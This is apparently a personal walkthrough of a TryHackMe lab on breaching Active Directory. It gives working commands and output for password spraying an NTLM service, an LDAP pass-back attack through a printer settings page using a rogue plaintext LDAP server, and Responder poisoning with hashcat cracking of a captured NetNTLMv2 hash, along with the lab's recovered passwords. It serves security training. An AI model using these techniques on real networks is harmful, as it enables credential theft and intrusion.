
Task1 - Introduction to AD Breaches
-----------------------------------------------------------

In order to breach AD and exploit the misconfigurations that may exist, we need to find some intial credentials through methods like OSINT. Once we get those creds we can escalate and move laterally, etc.

Here are some of the techniques to recover AD credentials in the network:

-   NTLM Authenticated Services
-   LDAP Bind Credentials
-   Authentication Relays
-   Microsoft Deployment Toolkit
-   Configuration Files

Be sure to follow the instructions for connecting to the network. At a minimum you need to  setup DNS even on the attackbox:

 `[thm@thm]$ systemd-resolve --interface breachad --set-dns $THMDCIP --set-domain za.tryhackme.com`

nslookup thmdc.za.tryhackme.com should resolve the IP of your DC.

Be sure to take note of your IP (breached network adapater)

For your own Kali etc, you need to  download a separate ovpn config called 'BreachingAD', after that you can configure DNS (Kali):

-   Network Manager -> Advanced Network Configuration -> Your Connection -> IPv4 Settings
-   Set your DNS IP here to the IP for THMDC in the network diagram above  
    
-   Add another DNS such as 1.1.1.1 or similar to ensure you still have internet access
-   Run `sudo systemctl restart NetworkManager` and test your DNS similar to the steps above.

Out network adapter setting:
```bash
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 02:1b:ba:bb:64:31 brd ff:ff:ff:ff:ff:ff
    inet 10.10.219.200/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::1b:baff:febb:6431/64 scope link 
       valid_lft forever preferred_lft forever
3: breachad: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 100
    link/none 
    inet 10.50.25.45/26 brd 10.50.25.63 scope global breachad
       valid_lft forever preferred_lft forever
    inet6 fe80::a097:e202:5fa0:3ca2/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
```

Now setup DNS:

```
root@ip-10-10-219-200:~# systemd-resolve --interface breachad --set-dns 10.200.27.101 --set-domain za.tryhackme.com
root@ip-10-10-219-200:~# nslookup thmdc.za.tryhackme.com
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	thmdc.za.tryhackme.com
Address: 10.200.27.101
```


__Questions__

I have completed the AD basics room and am ready to learn about AD breaching techniques.
_No answer needed_

I have connected to the network and configured DNS.
_No answer needed_


Task2 - OSINT and Phishing
----------------------------------------------

There are a few ways we can find some intial credentials.

OSINT, Phishing, IRC etc.

__OSINT__

-   Users who ask questions on public forums such as [Stack Overflow](https://stackoverflow.com/) but disclose sensitive information such as their credentials in the question.
-   Developers that upload scripts to services such as [Github](https://github.com/) with credentials hardcoded.
-   Credentials being disclosed in past breaches since employees used their work accounts to sign up for other external websites. Websites such as [HaveIBeenPwned](https://haveibeenpwned.com/) and [DeHashed](https://www.dehashed.com/) provide excellent platforms to determine if someone's information, such as work email, was ever involved in a publicly known data breach.

__Phishing__

Another great way is using crafted emails to trick people into putting in personal information, logins and passwords, run local Remote Access Trojans (RAT)s so you can get access right away.

__Questions__

I understand OSINT and how it can be used to breach AD
_No answer needed_

I understand Phishing and how it can be used to breach AD
_No answer needed_

What popular website can be used to verify if your email address or password has ever been exposed in a publically disclosed data breach?
Answer: _haveibeenpwned_


Task3 - NTLM Authenticated Services
----------------------------------------------------------------------

New Technology LAN Manager (_NTLM_) is a suite of security protocols to authenticate users to AD. NetNTLM uses a challenge-response mechanism but does not transmit password over the network. One big problem with NTLM is that services that use it can be exposed over the internet. Here are some popular examples.

-   Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.
-   Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
-   Exposed VPN endpoints that were integrated with AD.
-   Web applications that are internet-facing and make use of NetNTLM.

I won't go over how NetNTLM works beause that was done in the AD Basics, but rather a quick summary is that Application user sends access request to server, which sends back a challenge, to which the client responds, that challenge/response pair is sent to the server for verification. the response is then sent back to the server and finally to the client.

__Brute-Force Login Attacks

Brute-force in a traditional sense is not really feasible in AD normally because these services typically detect brute-force logins when a single user repeated fails to login. If you gather a user/password pair from your OSINT then that is best, but if not it maybe better to try Password Spraying attempts. That is to use one known or very likely password, such as when an org provides users with a default password like 'ChangeMe123' when setting up new users. Some users either get bogged down with new setup, or just forget to change their password. 

You can use a few different methods for this, such as Hydra but it is recommended to use a Python script since you can control it better.

In this exersise we will just use the python script provided from our OSINT files in the Task which we can download when starting the task.

```bash
root@ip-10-10-219-200:~/Rooms/BreachingAD/task3# python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
[*] Starting passwords spray attack using the following password: Changeme123
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: samantha.thompson
[-] Failed login with Username: dawn.turner
[-] Failed login with Username: frances.chapman
[-] Failed login with Username: henry.taylor
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[-] Failed login with Username: louise.talbot
[+] Valid credential pair found! Username: heather.smith Password: Changeme123
[-] Failed login with Username: dominic.elliott
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
[-] Failed login with Username: alan.jones
[-] Failed login with Username: frank.fletcher
[-] Failed login with Username: maria.sheppard
[-] Failed login with Username: sophie.blackburn
[-] Failed login with Username: dawn.hughes
[-] Failed login with Username: henry.black
[-] Failed login with Username: joanne.davies
[-] Failed login with Username: mark.oconnor
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
[*] Password spray attack completed, 4 valid credential pairs found

```

__Questions__

What is the name of the challenge-response authentication mechanism that uses NTLM?
Answer: _NetNTLM_

What is the username of the third valid credential pair found by the password spraying script?
Answer: _gordon.stevens_

How many valid credentials pairs were found by the password spraying script?
Answer: _4_

What is the message displayed by the web application when authenticating with a valid credential pair?
Answer: _Hello World_



Task4 - LDAP Bind Credentials
-----------------------------------------------------

LDAP or Lightweight Directory Access Protocol is a very popular method used to other non-microsoft apps to authenticate to AD.

Some examples that use this are Gitlab, Jenkins, Web apps, Printers, etc.

The format for authentication is:

USER sends requests with user/pass
SERVER sends its AD credentials to create a BIND request to DOMAIN CONTROLLER (DC). 
DC sends response 
SERVER requests user search
AD sends User search response, 
LDAP BIND request with user credentials is send to DC, 
DC sends back BIND response, 
SERVER then sends back to user authentication and job is accepted.

If we can gain a foothold on a script server or Gitlab etc, it could be easy to find the AD credentials usually in plain text config file.

Another intersting and common method however is just using an LDAP Pass-back Attack. This happens when we gain access to a device's config where the LDAP parameters are specified. Usually these credentials are kept as default such as admin:admin or admin:password. If we can alter the LDAP config such as the hostname or IP then test, it will foce the device to attempt LDAP auth to our rogue device. We can intercept this authentication attempt to recover the credentials.

In this Task we will check out a printer.

We can access the printers config but we cannot see the password. 

We setup a netcat listener `nc -lnvp 389` and get it to connect to us.  Unfortunately this won't work since we get back the 'SupportedCapabilities' keyword indicating it cannot send clear text passwords.

```bash
$ nc -lvp 389
listening on [any] 389 ...
10.10.10.201: inverse host lookup failed: Unknown host
connect to [10.10.10.55] from (UNKNOWN) [10.10.10.201] 49765
0?DC?;
?
?x
 objectclass0?supportedCapabilities
```

We need to setup a rougue LDAP server.

For our own Kali attack machine:

```bash
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

For Attackbox we can just reconfigure LDAP thats installed (slapd):

```bash
sudo dpkg-reconfigure -p low slapd
```

Then follow the instructions for setup. I won't cover that here since it is already listed on THM.


You will need to press the Test Settings button a few times before TCP dump sees it.

Once it is setup we can create a new ldif file to downgrade auth mechanisms.

```bash
#olcSaslSecProps.ldif 
dn: cn=config 
replace: olcSaslSecProps 
olcSaslSecProps: noanonymous,minssf=0,passcred`
```

The file has the following properties:

-   **olcSaslSecProps:** Specifies the SASL security properties
-   **noanonymous:** Disables mechanisms that support anonymous login
-   **minssf:** Specifies the minimum acceptable security strength with 0, meaning no protection.

Now use the new ldif file:

```bash
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

Test Changes:
```
[thm@thm]$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms dn: 
supportedSASLMechanisms: PLAIN 
supportedSASLMechanisms: LOGIN
```

Once you have the printer authenticating to our rogue LDAP server then we get an error 'This distinguished name has invalid syntax'

We can use the following command in TCP dump to capture the credentials:

```bash
$ sudo tcpdump -SX -i breachad tcp port 389
```

We can navigate to http://printer.za.tryhackme.com/settings.aspx and see that though we cannot see the LDAP password for the user svcLDAP, we do have access to change some setting like Server IP.

```bash
root@ip-10-10-219-200:~# vi olcSasslSecProps.ldif

root@ip-10-10-219-200:~# cat olcSasslSecProps.ldif
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

Modify ldap using our new config which allows only plain text auth:
```bash
root@ip-10-10-219-200:~# sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSasslSecProps.ldif && sudo service slapd restart
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"
```

Testing the config:
```bash
root@ip-10-10-219-200:~# ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: LOGIN
supportedSASLMechanisms: PLAIN
```

Set up tcp dump to listen:
```bash
root@ip-10-10-219-200:~# sudo tcpdump -SX -i breachad tcp port 389
```

Now trigger LDAP connection by changing the IP  at [http://printer.za.tryhackme.com/settings.aspx](http://printer.za.tryhackme.com/settings.aspx) to our breachad IP. (again find by running ip a or ifconfig -a) and clicking the "Test Settings" button:

```bash
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on breachad, link-type RAW (Raw IP), capture size 262144 bytes
00:15:45.445438 IP ip-10-200-27-201.eu-west-1.compute.internal.59151 > ip-10-50-25-45.eu-west-1.compute.internal.ldap: Flags [SEW], seq 1942077730, win 64240, options [mss 1289,nop,wscale 8,nop,nop,sackOK], length 0
	0x0000:  4502 0034 3e9f 4000 7f06 7333 0ac8 1bc9  E..4>.@...s3....
	0x0010:  0a32 192d e70f 0185 73c1 c122 0000 0000  .2.-....s.."....
	0x0020:  80c2 faf0 0ca2 0000 0204 0509 0103 0308  ................
	0x0030:  0101 0402                                ....
00:15:45.445479 IP ip-10-50-25-45.eu-west-1.compute.internal.ldap > ip-10-200-27-201.eu-west-1.compute.internal.59151: Flags [S.], seq 1215085014, ack 1942077731, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
	0x0000:  4500 0034 0000 4000 4006 f0d4 0a32 192d  E..4..@.@....2.-
	0x0010:  0ac8 1bc9 0185 e70f 486c b9d6 73c1 c123  ........Hl..s..#
	0x0020:  8012 faf0 0a64 0000 0204 05b4 0101 0402  .....d..........
	0x0030:  0103 0307                                ....
00:15:45.446313 IP ip-10-200-27-201.eu-west-1.compute.internal.59151 > ip-10-50-25-45.eu-west-1.compute.internal.ldap: Flags [.], ack 1215085015, win 8217, length 0
	0x0000:  4500 0028 3ea0 4000 7f06 7340 0ac8 1bc9  E..(>.@...s@....
	0x0010:  0a32 192d e70f 0185 73c1 c123 486c b9d7  .2.-....s..#Hl..
	0x0020:  5010 2019 260e 0000                      P...&...
00:15:45.446563 IP ip-10-200-27-201.eu-west-1.compute.internal.59151 > ip-10-50-25-45.eu-west-1.compute.internal.ldap: Flags [P.], seq 1942077731:1942077805, ack 1215085015, win 8217, length 74
	0x0000:  4500 0072 3ea1 4000 7f06 72f5 0ac8 1bc9  E..r>.@...r.....
	0x0010:  0a32 192d e70f 0185 73c1 c123 486c b9d7  .2.-....s..#Hl..
	0x0020:  5018 2019 e480 0000 3084 0000 0044 0201  P.......0....D..
	0x0030:  0163 8400 0000 3b04 000a 0100 0a01 0002  .c....;.........
	0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
	0x0050:  636c 6173 7330 8400 0000 1704 1573 7570  class0.......sup
	0x0060:  706f 7274 6564 4361 7061 6269 6c69 7469  portedCapabiliti
	0x0070:  6573                                     es
00:15:45.446582 IP ip-10-50-25-45.eu-west-1.compute.internal.ldap > ip-10-200-27-201.eu-west-1.compute.internal.59151: Flags [.], ack 1942077805, win 502, length 0
	0x0000:  4500 0028 accd 4000 4006 4413 0a32 192d  E..(..@.@.D..2.-
	0x0010:  0ac8 1bc9 0185 e70f 486c b9d7 73c1 c16d  ........Hl..s..m
	0x0020:  5010 01f6 43e7 0000                      P...C...
00:15:45.446697 IP ip-10-50-25-45.eu-west-1.compute.internal.ldap > ip-10-200-27-201.eu-west-1.compute.internal.59151: Flags [P.], seq 1215085015:1215085026, ack 1942077805, win 502, length 11
	0x0000:  4500 0033 acce 4000 4006 4407 0a32 192d  E..3..@.@.D..2.-
	0x0010:  0ac8 1bc9 0185 e70f 486c b9d7 73c1 c16d  ........Hl..s..m
	0x0020:  5018 01f6 0c32 0000 3009 0201 0164 0404  P....2..0....d..
	0x0030:  0030 00                                  .0.
00:15:45.446725 IP ip-10-50-25-45.eu-west-1.compute.internal.ldap > ip-10-200-27-201.eu-west-1.compute.internal.59151: Flags [P.], seq 1215085026:1215085040, ack 1942077805, win 502, length 14
	0x0000:  4500 0036 accf 4000 4006 4403 0a32 192d  E..6..@.@.D..2.-
	0x0010:  0ac8 1bc9 0185 e70f 486c b9e2 73c1 c16d  ........Hl..s..m
	0x0020:  5018 01f6 004a 0000 300c 0201 0165 070a  P....J..0....e..
	0x0030:  0100 0400 0400                           ......
00:15:45.463452 IP ip-10-200-27-201.eu-west-1.compute.internal.59151 > ip-10-50-25-45.eu-west-1.compute.internal.ldap: Flags [P.], seq 1942077881:1942077955, ack 1215085108, win 8217, length 74
	0x0000:  4500 0072 3ea6 4000 7f06 72f0 0ac8 1bc9  E..r>.@...r.....
	0x0010:  0a32 192d e70f 0185 73c1 c1b9 486c ba34  .2.-....s...Hl.4
	0x0020:  5018 2019 e18d 0000 3084 0000 0044 0201  P.......0....D..
	0x0030:  0363 8400 0000 3b04 000a 0100 0a01 0002  .c....;.........
	0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
	0x0050:  636c 6173 7330 8400 0000 1704 1573 7570  class0.......sup
	0x0060:  706f 7274 6564 4361 7061 6269 6c69 7469  portedCapabiliti
	0x0070:  6573                                     es
00:15:45.463633 IP ip-10-50-25-45.eu-west-1.compute.internal.ldap > ip-10-200-27-201.eu-west-1.compute.internal.59151: Flags [P.], seq 1215085108:1215085119, ack 1942077955, win 502, length 11
	0x0000:  4500 0033 acd2 4000 4006 4403 0a32 192d  E..3..@.@.D..2.-
	0x0010:  0ac8 1bc9 0185 e70f 486c ba34 73c1 c203  ........Hl.4s...
	0x0020:  5018 01f6 093f 0000 3009 0201 0364 0404  P....?..0....d..
	0x0030:  0030 00                                  .0.
00:15:45.463657 IP ip-10-50-25-45.eu-west-1.compute.internal.ldap > ip-10-200-27-201.eu-west-1.compute.internal.59151: Flags [P.], seq 1215085119:1215085133, ack 1942077955, win 502, length 14
	0x0000:  4500 0036 acd3 4000 4006 43ff 0a32 192d  E..6..@.@.C..2.-
	0x0010:  0ac8 1bc9 0185 e70f 486c ba3f 73c1 c203  ........Hl.?s...
	0x0020:  5018 01f6 fd56 0000 300c 0201 0365 070a  P....V..0....e..
	0x0030:  0100 0400 0400                           ......
00:15:45.464432 IP ip-10-200-27-201.eu-west-1.compute.internal.59151 > ip-10-50-25-45.eu-west-1.compute.internal.ldap: Flags [.], ack 1215085133, win 8216, length 0
	0x0000:  4500 0028 3ea7 4000 7f06 7339 0ac8 1bc9  E..(>.@...s9....
	0x0010:  0a32 192d e70f 0185 73c1 c203 486c ba4d  .2.-....s...Hl.M
	0x0020:  5010 2018 24b9 0000                      P...$...
00:15:45.465207 IP ip-10-200-27-201.eu-west-1.compute.internal.59151 > ip-10-50-25-45.eu-west-1.compute.internal.ldap: Flags [P.], seq 1942077955:1942078021, ack 1215085133, win 8216, length 66
	0x0000:  4500 006a 3ea8 4000 7f06 72f6 0ac8 1bc9  E..j>.@...r.....
	0x0010:  0a32 192d e70f 0185 73c1 c203 486c ba4d  .2.-....s...Hl.M
	0x0020:  5018 2018 500c 0000 3084 0000 003c 0201  P...P...0....<..
	0x0030:  0460 8400 0000 3302 0103 0404 4e54 4c4d  .`....3.....NTLM
	0x0040:  8a28 4e54 4c4d 5353 5000 0100 0000 0782  .(NTLMSSP.......
	0x0050:  08a2 0000 0000 0000 0000 0000 0000 0000  ................
	0x0060:  0000 0a00 6345 0000 000f                 ....cE....
00:15:45.465343 IP ip-10-50-25-45.eu-west-1.compute.internal.ldap > ip-10-200-27-201.eu-west-1.compute.internal.59151: Flags [P.], seq 1215085133:1215085157, ack 1942078021, win 502, length 24
	0x0000:  4500 0040 acd4 4000 4006 43f4 0a32 192d  E..@..@.@.C..2.-
	0x0010:  0ac8 1bc9 0185 e70f 486c ba4d 73c1 c245  ........Hl.Ms..E
	0x0020:  5018 01f6 fd22 0000 3016 0201 0461 110a  P...."..0....a..
	0x0030:  0122 0400 040a 696e 7661 6c69 6420 444e  ."....invalid.DN
00:15:45.467261 IP ip-10-200-27-201.eu-west-1.compute.internal.59152 > ip-10-50-25-45.eu-west-1.compute.internal.ldap: Flags [SEW], seq 2851709536, win 64240, options [mss 1289,nop,wscale 8,nop,nop,sackOK], length 0
	0x0000:  4502 0034 3ea9 4000 7f06 7329 0ac8 1bc9  E..4>.@...s)....
	0x0010:  0a32 192d e710 0185 a9f9 a260 0000 0000  .2.-.......`....
	0x0020:  80c2 faf0 f52a 0000 0204 0509 0103 0308  .....*..........
	0x0030:  0101 0402                                ....
00:15:45.467296 IP ip-10-50-25-45.eu-west-1.compute.internal.ldap > ip-10-200-27-201.eu-west-1.compute.internal.59152: Flags [S.], seq 2950287652, ack 2851709537, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
	0x0000:  4500 0034 0000 4000 4006 f0d4 0a32 192d  E..4..@.@....2.-
	0x0010:  0ac8 1bc9 0185 e710 afd9 d124 a9f9 a261  ...........$...a
	0x0020:  8012 faf0 7431 0000 0204 05b4 0101 0402  ....t1..........
	0x0030:  0103 0307                                ....
00:15:45.467992 IP ip-10-200-27-201.eu-west-1.compute.internal.59152 > ip-10-50-25-45.eu-west-1.compute.internal.ldap: Flags [.], ack 2950287653, win 8217, length 0
	0x0000:  4500 0028 3eaa 4000 7f06 7336 0ac8 1bc9  E..(>.@...s6....
	0x0010:  0a32 192d e710 0185 a9f9 a261 afd9 d125  .2.-.......a...%
	0x0020:  5010 2019 8fdb 0000                      P.......
00:15:45.468055 IP ip-10-200-27-201.eu-west-1.compute.internal.59152 > ip-10-50-25-45.eu-west-1.compute.internal.ldap: Flags [P.], seq 2851709537:2851709602, ack 2950287653, win 8217, length 65
	0x0000:  4500 0069 3eab 4000 7f06 72f4 0ac8 1bc9  E..i>.@...r.....
	0x0010:  0a32 192d e710 0185 a9f9 a261 afd9 d125  .2.-.......a...%
	0x0020:  5018 2019 bff5 0000 3084 0000 003b 0201  P.......0....;..
	0x0030:  0560 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
	0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
	0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..tryhackmel
	0x0060:  6461 7070 6173 7331 40                   dappass1@
00:15:45.468067 IP ip-10-50-25-45.eu-west-1.compute.internal.ldap > ip-10-200-27-201.eu-west-1.compute.internal.59152: Flags [.], ack 2851709602, win 502, length 0
	0x0000:  4500 0028 0927 4000 4006 e7b9 0a32 192d  E..(.'@.@....2.-
	0x0010:  0ac8 1bc9 0185 e710 afd9 d125 a9f9 a2a2  ...........%....
	0x0020:  5010 01f6 adbd 0000                      P.......
00:15:45.468325 IP ip-10-50-25-45.eu-west-1.compute.internal.ldap > ip-10-200-27-201.eu-west-1.compute.internal.59152: Flags [P.], seq 2950287653:2950287677, ack 2851709602, win 502, length 24
	0x0000:  4500 0040 0928 4000 4006 e7a0 0a32 192d  E..@.(@.@....2.-
	0x0010:  0ac8 1bc9 0185 e710 afd9 d125 a9f9 a2a2  ...........%....
	0x0020:  5018 01f6 6747 0000 3016 0201 0561 110a  P...gG..0....a..
	0x0030:  0122 0400 040a 696e 7661 6c69 6420 444e  ."....invalid.DN
00:15:45.489329 IP ip-10-200-27-201.eu-west-1.compute.internal.59151 > ip-10-50-25-45.eu-west-1.compute.internal.ldap: Flags [.], ack 1215085157, win 8216, length 0
	0x0000:  4500 0028 3eae 4000 7f06 7332 0ac8 1bc9  E..(>.@...s2....
	0x0010:  0a32 192d e70f 0185 73c1 c245 486c ba65  .2.-....s..EHl.e
	0x0020:  5010 2018 245f 0000                      P...$_..
00:15:45.489374 IP ip-10-200-27-201.eu-west-1.compute.internal.59152 > ip-10-50-25-45.eu-west-1.compute.internal.ldap: Flags [.], ack 2950287677, win 8217, length 0
	0x0000:  4500 0028 3eaf 4000 7f06 7331 0ac8 1bc9  E..(>.@...s1....
	0x0010:  0a32 192d e710 0185 a9f9 a2a2 afd9 d13d  .2.-...........=
	0x0020:  5010 2019 8f82 0000                      P.......
```

The output is a bit convoluted but the ASCII shows the plaintext here:
```bash
0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
	0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..tryhackmel
	0x0060:  6461 7070 6173 7331 40                   dappass1@
```

tryhackmeldappass1

__Questions__

What type of attack can be performed against LDAP Authentication systems not commonly found against Windows Authentication systems?
Answer: _LDAP Pass-back Attack_

What two authentication mechanisms do we allow on our rogue LDAP server to downgrade the authentication and make it clear text?
Answer: _plain, login_

What is the password associated with the svcLDAP account?
Answer: _tryhackmeldappass1_


Task5 - Authentication Relays
---------------------------------------------------

In this task we will take a closer look at the Server Message Block (SMB) protocol and how it governs things in a Microsoft network like file sharing, printers and even remote administration.

In older versions of SMB, there were a number of vulnerabilities that allowed easy cracking and takeover of systems running older versions. These were patched however many organisations still do not enforce using the newer protocols and are therefore still vulnerable.

Here we will check out a few different exploits:
Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Servier (NBT-NS), and Web Proxy Auto-Discovery (WPAD) are poisoning attacks that allow our responder to intercept NetNTLM challenges to crack them.

On real networks these hosts will attempt to resolve hosts in their own local network by sending LLMNR requests to see if any hosts respond. The NBT-NS is the precursor protocol to LLMNR and WPAD requests are made to try and find a proxy for future HTTP(s) connections.

Since these hosts are using broadcast, our responder can listen to them and respond as well. Normally since they aren't meant for us we would drop them. We will send poisoned responses telling them that our IP is associated with the requested hostname. This way the target will attempt to connect to our Attackbox. It will also host several services such as SMB, HTTP and SQL and others to capture the requests.

These types of attacks  are disruptive and can be detected.

```bash
root@ip-10-10-219-200:~# responder -I breachad
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [breachad]
    Responder IP               [10.50.25.45]
    Responder IPv6             [fe80::a097:e202:5fa0:3ca2]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-ZLLVQGETCWF]
    Responder Domain Name      [EQBW.LOCAL]
    Responder DCE-RPC Port     [48046]

[+] Listening for events...

[!] Error starting TCP server on port 80, check permissions or other servers running.
[!] Error starting TCP server on port 3389, check permissions or other servers running.
[!] Error starting TCP server on port 389, check permissions or other servers running.
```

Now we just wait.

```
[SMB] NTLMv2-SSP Client   : ::ffff:10.200.27.202
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:03d60a9873c412bd:6716428B258B2804CFB0337A3D6F701D:010100000000000000D4027079F1D801CEABE1C8A8E3706A0000000002000800450051004200570001001E00570049004E002D005A004C004C005600510047004500540043005700460004003400570049004E002D005A004C004C00560051004700450054004300570046002E0045005100420057002E004C004F00430041004C000300140045005100420057002E004C004F00430041004C000500140045005100420057002E004C004F00430041004C000700080000D4027079F1D801060004000200000008003000300000000000000000000000002000005DC95E26535D94F61C4A0A926CD65C24F2557F738E7306EA741DDE9BF254ACAD0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00320035002E00340035000000000000000000

```

Now we can crack it with hashcat:
```bash
root@ip-10-10-219-200:~# hashcat -m 5600 badhash.txt Rooms/BreachingAD/task5/passwordlist.txt --force
hashcat (v6.1.1-66-g6a419d06) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 2.0 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz, 3878/3942 MB (985 MB allocatable), 2MCU

OpenCL API (OpenCL 1.2 pocl 1.1 None+Asserts, LLVM 6.0.0, SPIR, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
===========================================================================================================================
* Device #2: pthread-Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: Rooms/BreachingAD/task5/passwordlist.txt
* Passwords.: 513
* Bytes.....: 4010
* Keyspace..: 513
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

SVCFILECOPY::ZA:03d60a9873c412bd:6716428b258b2804cfb0337a3d6f701d:010100000000000000d4027079f1d801ceabe1c8a8e3706a0000000002000800450051004200570001001e00570049004e002d005a004c004c005600510047004500540043005700460004003400570049004e002d005a004c004c00560051004700450054004300570046002e0045005100420057002e004c004f00430041004c000300140045005100420057002e004c004f00430041004c000500140045005100420057002e004c004f00430041004c000700080000d4027079f1d801060004000200000008003000300000000000000000000000002000005dc95e26535d94f61c4a0a926cd65c24f2557f738e7306ea741dde9bf254acad0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00350030002e00320035002e00340035000000000000000000:FPassword1!
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: SVCFILECOPY::ZA:03d60a9873c412bd:6716428b258b2804cf...000000
Time.Started.....: Sun Nov  6 00:55:04 2022, (0 secs)
Time.Estimated...: Sun Nov  6 00:55:04 2022, (0 secs)
Guess.Base.......: File (Rooms/BreachingAD/task5/passwordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   561.1 kH/s (0.72ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 513/513 (100.00%)
Rejected.........: 0/513 (0.00%)
Restore.Point....: 0/513 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> hockey

Started: Sun Nov  6 00:54:30 2022
Stopped: Sun Nov  6 00:55:05 2022
root@ip-10-10-219-200:~# 
```

It is possible to relay challenges but we would need to have a number of things in our favor such as SMB signing must be off or disabled, and the associated account would need permissions on the server to access the requested resources. This is why we typically do AD enumeration first by gaining some initial foothold.

__Questions__

What is the name of the tool we can use to poison and capture authentication requests on the network?
Answer: _responder_

What is the username associated with the challenge that was captured?
Answer: _svcFileCopy_

What is the value of the cracked password associated with the challenge that was captured?
Answer: _FPassword1!_


Task6 - Microsoft Deployment Toolkit
------------------------------------------------------------

MDT - Microsoft Deployment Toolkit is a Microsoft service that assist in automating  of Microsoft OS's. 

SCCM - System Center Configuration Manager manages all updates for MS Applications, services and OS's.  MDT is usually intergrated in that. 

